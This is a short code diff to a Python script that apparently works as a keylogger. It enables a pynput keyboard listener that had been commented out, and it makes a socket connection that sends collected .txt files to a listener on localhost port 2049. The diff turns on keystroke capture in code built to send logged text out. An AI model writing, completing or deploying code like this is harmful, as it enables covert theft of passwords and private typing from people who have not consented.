@@ -127,8 +127,10 @@ def send_files():
     for file in temp_liste:
         if file.find(".txt") != -1:
             liste.append(file)
-    socket.connect(("localhost", 2049))
-
+    try:
+        socket.connect(("localhost", 2049))
+    except:
+        print('CONNECT ERROR')
     # For every .txt file
     for text_file in liste:
         text_lines = []
@@ -164,10 +166,9 @@ def send_list():
     socket.close()
 
 
-"""
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-"""
+
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 send_files()
